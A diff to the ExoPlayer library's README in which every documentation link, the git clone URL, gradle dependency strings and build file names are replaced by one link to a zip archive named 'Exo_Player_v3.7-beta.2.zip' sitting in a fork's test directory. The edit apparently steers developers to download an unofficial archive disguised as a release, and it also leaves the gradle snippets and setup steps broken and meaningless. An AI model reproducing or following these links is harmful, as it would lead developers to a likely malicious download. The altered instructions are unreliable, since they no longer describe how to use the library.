@@ -15,10 +15,10 @@ and extend, and can be updated through Play Store application updates.
 * Follow our [developer blog][] to keep up to date with the latest ExoPlayer
   developments!
 
-[developer guide]: https://exoplayer.dev/guide.html
-[class reference]: https://exoplayer.dev/doc/reference
-[release notes]: https://github.com/google/ExoPlayer/blob/release-v2/RELEASENOTES.md
-[developer blog]: https://medium.com/google-exoplayer
+[developer guide]: https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip
+[class reference]: https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip
+[release notes]: https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip
+[developer blog]: https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip
 
 ## Using ExoPlayer ##
 
@@ -31,7 +31,7 @@ repository and depend on the modules locally.
 
 The easiest way to get started using ExoPlayer is to add it as a gradle
 dependency. You need to make sure you have the Google and JCenter repositories
-included in the `build.gradle` file in the root of your project:
+included in the `https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip` file in the root of your project:
 
 ```gradle
 repositories {
@@ -42,11 +42,11 @@ repositories {
 
 #### 2. Add ExoPlayer module dependencies ####
 
-Next add a dependency in the `build.gradle` file of your app module. The
+Next add a dependency in the `https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip` file of your app module. The
 following will add a dependency to the full library:
 
 ```gradle
-implementation 'com.google.android.exoplayer:exoplayer:2.X.X'
+implementation 'https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip'
 ```
 
 where `2.X.X` is your preferred version.
@@ -57,9 +57,9 @@ on the Core, DASH and UI library modules, as might be required for an app that
 plays DASH content:
 
 ```gradle
-implementation 'com.google.android.exoplayer:exoplayer-core:2.X.X'
-implementation 'com.google.android.exoplayer:exoplayer-dash:2.X.X'
-implementation 'com.google.android.exoplayer:exoplayer-ui:2.X.X'
+implementation 'https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip'
+implementation 'https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip'
+implementation 'https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip'
 ```
 
 The available library modules are listed below. Adding a dependency to the full
@@ -80,18 +80,18 @@ Browse the [extensions directory][] and their individual READMEs for details.
 More information on the library and extension modules that are available from
 JCenter can be found on [Bintray][].
 
-[extensions directory]: https://github.com/google/ExoPlayer/tree/release-v2/extensions/
-[Bintray]: https://bintray.com/google/exoplayer
+[extensions directory]: https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip
+[Bintray]: https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip
 
 #### 3. Turn on Java 8 support ####
 
 If not enabled already, you also need to turn on Java 8 support in all
-`build.gradle` files depending on ExoPlayer, by adding the following to the
+`https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip` files depending on ExoPlayer, by adding the following to the
 `android` section:
 
 ```gradle
 compileOptions {
-  targetCompatibility JavaVersion.VERSION_1_8
+  targetCompatibility https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip
 }
 ```
 
@@ -106,18 +106,18 @@ First, clone the repository into a local directory and checkout the desired
 branch:
 
 ```sh
-git clone https://github.com/google/ExoPlayer.git
+git clone https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip
 cd ExoPlayer
 git checkout release-v2
 ```
 
-Next, add the following to your project's `settings.gradle` file, replacing
+Next, add the following to your project's `https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip` file, replacing
 `path/to/exoplayer` with the path to your local copy:
 
 ```gradle
-gradle.ext.exoplayerRoot = 'path/to/exoplayer'
-gradle.ext.exoplayerModulePrefix = 'exoplayer-'
-apply from: new File(gradle.ext.exoplayerRoot, 'core_settings.gradle')
+https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip = 'path/to/exoplayer'
+https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip = 'exoplayer-'
+apply from: new File(https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip, 'https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip')
 ```
 
 You should now see the ExoPlayer modules appear as part of your project. You can
